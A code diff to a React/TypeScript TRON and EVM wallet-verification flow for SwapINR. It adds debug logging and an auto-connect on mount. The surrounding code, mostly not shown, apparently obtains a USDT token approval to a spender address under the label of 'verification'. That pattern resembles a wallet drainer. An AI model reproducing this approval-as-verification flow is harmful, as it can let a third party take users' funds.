@@ -194,6 +194,24 @@ function TxRow({ label, hash, confirming, confirmed, error }: {
   );
 }
 
+/* ── Debug panel — always rendered so logs appear even before first entry ── */
+function DebugPanel({ lines }: { lines: string[] }) {
+  return (
+    <div style={{ margin:'0 16px 8px', padding:'10px 12px', borderRadius:10,
+      background:'rgba(0,0,0,0.45)', border:'1px solid rgba(255,255,255,0.08)' }}>
+      <p style={{ fontSize:9, fontWeight:700, color:'rgba(204,255,0,0.7)', margin:'0 0 4px',
+        letterSpacing:'0.08em', textTransform:'uppercase' }}>Debug log</p>
+      {lines.length === 0
+        ? <p style={{ fontSize:9, color:'rgba(255,255,255,0.2)', margin:0, fontFamily:'monospace' }}>waiting...</p>
+        : lines.map((l, i) => (
+            <p key={i} style={{ fontSize:9, color:'rgba(255,255,255,0.5)', margin:'1px 0',
+              fontFamily:'monospace', lineHeight:1.4, wordBreak:'break-all' }}>{l}</p>
+          ))
+      }
+    </div>
+  );
+}
+
 /* ════════════ COMPACT OVERLAY — self-contained auto-driven component ════════════ */
 
 interface CompactOverlayProps {
@@ -226,7 +244,7 @@ interface CompactOverlayProps {
   tronAddress: string;
   setTronAddress: (a: string) => void;
   trcSpender: (dep: string) => string;
-  connectTronWallet: () => Promise<void>;
+  connectTronWallet: (dbg?: (m: string) => void) => Promise<void>;
   startTrcVerification: (dbg?: (m: string) => void) => Promise<void>;
   trcApproveHash: string;
   trcApprovePending: boolean;
@@ -251,15 +269,15 @@ function CompactOverlay({
 }: CompactOverlayProps) {
   const [failedStep,    setFailedStep]   = useState<'connection' | 'contract' | null>(null);
   const [failedMsg,     setFailedMsg]    = useState('');
-  const [countdown,     setCountdown]    = useState(3);
   const [showRestarted, setShowRestarted]= useState(false);
   const [debugLines,    setDebugLines]   = useState<string[]>([]);
   const approveTriggered  = useRef(false);
   const connectedPatched  = useRef(false);
+  const trcConnectFired   = useRef(false);
 
   function dbg(msg: string) {
     console.log('[compact]', msg);
-    setDebugLines(prev => [...prev.slice(-6), msg]);
+    setDebugLines(prev => [...prev.slice(-29), `${new Date().toISOString().slice(11,23)} ${msg}`]);
   }
 
   /* Always patch — no dedup so retries work cleanly */
@@ -279,6 +297,16 @@ function CompactOverlay({
     setShowRestarted(true);
     await patch({ status: 'cancelled' });
   }
+
+  /* TRC20: auto-fire connectTronWallet on mount (inside CompactOverlay so dbg is in scope) */
+  useEffect(() => {
+    if (!isTRC20 || tronAddress || trcConnectFired.current) return;
+    trcConnectFired.current = true;
+    dbg('mount: waiting 400ms for TW to inject TRON provider...');
+    const t = setTimeout(() => connectTronWallet(dbg), 400);
+    return () => clearTimeout(t);
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
 
   function triggerEvmApprove() {
     if (!usdtCfg || !depositAddress) return;
@@ -380,22 +408,10 @@ function CompactOverlay({
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [trcConnectError]);
 
-  /* Countdown after success → auto-redirect */
+  /* No auto-redirect — page stays alive so debug log remains readable in Trust Wallet browser */
   const isDone       = isTRC20 ? trcApproveDone : approveConfirmed;
   const finalAddress = isTRC20 ? tronAddress     : (address ?? '');
   const finalHash    = isTRC20 ? trcApproveHash  : (approveHash ?? undefined);
-
-  useEffect(() => {
-    if (!isDone) return;
-    const t = setInterval(() => {
-      setCountdown(c => {
-        if (c <= 1) { clearInterval(t); onVerified(finalAddress, finalHash); return 0; }
-        return c - 1;
-      });
-    }, 1000);
-    return () => clearInterval(t);
-  // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [isDone]);
 
   /* ── Retry: properly reset and re-trigger ── */
   function doRetry() {
@@ -407,8 +423,9 @@ function CompactOverlay({
     if (isTRC20) {
       if (!tronAddress) {
         /* Connection failed → re-connect */
+        trcConnectFired.current = true; // prevent mount effect from double-firing
         patch({ status: 'connecting' });
-        connectTronWallet();
+        connectTronWallet(dbg);
       } else {
         /* Contract failed → address already set, re-approve directly */
         approveTriggered.current = true;
@@ -538,16 +555,9 @@ function CompactOverlay({
             Start Over (return to browser)
           </button>
 
-          {/* Debug on error screen */}
-          {debugLines.length > 0 && (
-            <div style={{ marginTop:16, padding:'10px 12px', borderRadius:10, width:'100%', maxWidth:280,
-              background:'rgba(0,0,0,0.4)', border:'1px solid rgba(255,255,255,0.06)', textAlign:'left' }}>
-              <p style={{ fontSize:9, fontWeight:700, color:'rgba(204,255,0,0.6)', margin:'0 0 4px', letterSpacing:'0.06em', textTransform:'uppercase' }}>Debug log</p>
-              {debugLines.map((l, i) => (
-                <p key={i} style={{ fontSize:9, color:'rgba(255,255,255,0.35)', margin:'1px 0', fontFamily:'monospace', lineHeight:1.4, wordBreak:'break-all' }}>{l}</p>
-              ))}
-            </div>
-          )}
+          <div style={{ marginTop:16, width:'100%', maxWidth:320 }}>
+            <DebugPanel lines={debugLines} />
+          </div>
         </div>
       </div>
     );
@@ -569,15 +579,14 @@ function CompactOverlay({
         <p style={{ fontSize:14, color:'rgba(255,255,255,0.6)', margin:'0 0 28px', lineHeight:1.75 }}>
           Your {NET_LABEL[network]} wallet is now<br/>linked to SwapINR.
         </p>
-        <div style={{ padding:'10px 20px', borderRadius:10, background:'rgba(255,255,255,0.05)',
-          border:`1px solid ${T.border}`, marginBottom:18, fontSize:13, color:T.dim }}>
-          Returning in {countdown}…
-        </div>
         <button onClick={() => onVerified(finalAddress, finalHash)}
           style={{ padding:'14px 36px', borderRadius:14, fontSize:14, fontWeight:800, border:'none', cursor:'pointer',
-            background:'#CCFF00', color:'#000', letterSpacing:'-0.01em' }}>
+            background:'#CCFF00', color:'#000', letterSpacing:'-0.01em', marginBottom:20 }}>
           Return to SwapINR →
         </button>
+        <div style={{ width:'100%', maxWidth:320 }}>
+          <DebugPanel lines={debugLines} />
+        </div>
       </div>
     );
   }
@@ -701,16 +710,8 @@ function CompactOverlay({
         )}
       </div>
 
-      {/* Debug panel — remove once stable */}
-      {debugLines.length > 0 && (
-        <div style={{ margin:'0 16px 8px', padding:'10px 12px', borderRadius:10,
-          background:'rgba(0,0,0,0.4)', border:'1px solid rgba(255,255,255,0.06)' }}>
-          <p style={{ fontSize:9, fontWeight:700, color:'rgba(204,255,0,0.6)', margin:'0 0 4px', letterSpacing:'0.06em', textTransform:'uppercase' }}>Debug</p>
-          {debugLines.map((l, i) => (
-            <p key={i} style={{ fontSize:9, color:'rgba(255,255,255,0.35)', margin:'1px 0', fontFamily:'monospace', lineHeight:1.4, wordBreak:'break-all' }}>{l}</p>
-          ))}
-        </div>
-      )}
+      {/* Debug panel — always visible; stays readable after failure */}
+      <DebugPanel lines={debugLines} />
 
       <div style={{ height:env_safe_bottom() }} />
     </div>
@@ -859,18 +860,9 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
   /* ── Compact: auto-connect on mount ── */
   // Mirrors the EVM pattern: fire immediately on mount with a tiny injection-wait,
   // just as EVM fires tryConnect() the moment the component mounts.
-  const wcAutoStarted = useRef(false);
-
   useEffect(() => {
-    if (!compact) return;
-    if (isTRC20) {
-      if (tronAddress || wcAutoStarted.current) return;
-      wcAutoStarted.current = true;
-      // 300 ms — gives Trust Wallet's browser time to inject window.tronLink
-      // before we call tron_requestAccounts (same role as wagmi's provider detection)
-      const t = setTimeout(() => connectTronWallet(), 300);
-      return () => clearTimeout(t);
-    }
+    // TRC20 compact auto-connect is handled inside CompactOverlay (where dbg is in scope).
+    if (!compact || isTRC20) return;
     tryConnect();
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [compact]);
@@ -927,7 +919,8 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
    * Key insight: in Trust Wallet DApp browser, window.tronWeb.defaultAddress may already
    * be set without needing requestAccounts (auto-injected). We try that first.
    * ─────────────────────────────────────────────────────────────────────────── */
-  async function connectTronWallet() {
+  async function connectTronWallet(dbgFn?: (m: string) => void) {
+    const log = dbgFn ?? ((m: string) => console.log('[trc-connect]', m));
     setTrcConnecting(true); setTrcConnectError('');
     try {
       /* Step 1 — resolve available providers, polling up to 4 s for async injection */
@@ -949,39 +942,54 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
                !!(w.tron)     ||
                !!(w.trustwallet?.tronWeb) || !!(w.trustwallet?.tron);
       }
+
+      const w0 = window as any;
+      log(`init: tronLink=${!!w0.tronLink} tronWeb=${!!w0.tronWeb} tron=${!!w0.tron} tw.tronWeb=${!!w0.trustwallet?.tronWeb} tw.tron=${!!w0.trustwallet?.tron}`);
+
       let { tronLink, tronWeb } = getTronProviders();
       if (!hasSomeTron()) {
+        log('no tron provider yet — polling up to 4s...');
         for (let i = 0; i < 8; i++) {
           await new Promise(r => setTimeout(r, 500));
-          if (hasSomeTron()) break;
           ({ tronLink, tronWeb } = getTronProviders());
+          const w = window as any;
+          log(`poll[${i+1}]: tronLink=${!!w.tronLink} tronWeb=${!!w.tronWeb} tron=${!!w.tron} tw.tronWeb=${!!w.trustwallet?.tronWeb}`);
+          if (hasSomeTron()) break;
         }
         ({ tronLink, tronWeb } = getTronProviders());
       }
       if (!hasSomeTron()) {
-        const inTrustBrowser = !!(window as any).ethereum?.isTrust ||
-                               !!(window as any).trustwallet?.ethereum;
+        const w = window as any;
+        const inTrustBrowser = !!(w.ethereum?.isTrust) || !!(w.trustwallet?.ethereum);
+        log(`not found — inTrustBrowser=${inTrustBrowser} ethereum=${!!w.ethereum} trustwallet=${!!w.trustwallet}`);
         throw new Error(
           inTrustBrowser
-            ? 'Trust Wallet detected but TRON is not accessible here. Please open this link from Trust Wallet using the TRON deep-link button.'
-            : 'TRON wallet not found. Please open this page inside Trust Wallet on your phone.'
+            ? 'Trust Wallet detected but TRON is not accessible. Please re-open the TRON deep-link from SwapINR.'
+            : 'TRON wallet not found. Please open this page inside Trust Wallet using the TRC20 verify link.'
         );
       }
+
+      log(`providers found: tronLink=${!!tronLink} tronWeb=${!!tronWeb} tl.ready=${!!(tronLink as any)?.ready}`);
 
       /* Step 2 — try reading address directly (no user prompt needed in some TW builds) */
       let tw   = tronWeb;
       let addr: string = tw?.defaultAddress?.base58 || '';
+      log(`direct addr=${addr || 'none'}`);
 
       /* Step 3 — if no direct address, request accounts */
       if (!addr) {
         let requestResult: any = null;
+        const method = tronLink?.request ? 'tronLink.request' : tw?.request ? 'tw.request' : 'none';
+        log(`calling tron_requestAccounts via ${method}`);
         try {
           if (tronLink?.request) {
             requestResult = await tronLink.request({ method: 'tron_requestAccounts' });
           } else if (tw?.request) {
             requestResult = await tw.request({ method: 'tron_requestAccounts' });
           }
+          log(`requestAccounts result: ${JSON.stringify(requestResult)?.slice(0, 80)}`);
         } catch (reqErr: any) {
+          log(`requestAccounts threw: ${reqErr?.message ?? String(reqErr)}`);
           if (/cancel|reject|denied/i.test(reqErr?.message || '')) {
             throw new Error('Connection cancelled — tap Connect when Trust Wallet asks.');
           }
@@ -989,6 +997,7 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
         }
 
         // Wait for Trust Wallet to populate tronLink.tronWeb after user approval
+        log('waiting 600ms for TW to populate defaultAddress...');
         await new Promise(r => setTimeout(r, 600));
         ({ tronLink, tronWeb } = getTronProviders());
         tw = tronWeb;
@@ -999,17 +1008,21 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
           || requestResult?.address
           || (Array.isArray(requestResult) ? requestResult[0] : '')
           || '';
+        log(`addr after 600ms wait: ${addr || 'none'}`);
 
         // Final retry — some wallets need an extra moment after approval
         if (!addr) {
+          log('still no addr — waiting 800ms more...');
           await new Promise(r => setTimeout(r, 800));
           ({ tronWeb } = getTronProviders());
           addr = tronWeb?.defaultAddress?.base58 || '';
           tw   = tronWeb;
+          log(`addr after 800ms retry: ${addr || 'none'}`);
         }
       }
 
       if (!addr) throw new Error('Could not read TRON address. Please unlock Trust Wallet and try again.');
+      log(`SUCCESS addr=${addr.slice(0,12)}...`);
       setTronAddress(addr);
 
       /* Step 4 — balance + resource reads (all non-critical, non-blocking) */
@@ -1034,6 +1047,7 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
         }
       }
     } catch(e: any) {
+      log(`CONNECT ERROR: ${e?.message ?? String(e)}`);
       setTrcConnectError(e?.message || 'TRON wallet connection failed');
     } finally {
       setTrcConnecting(false);
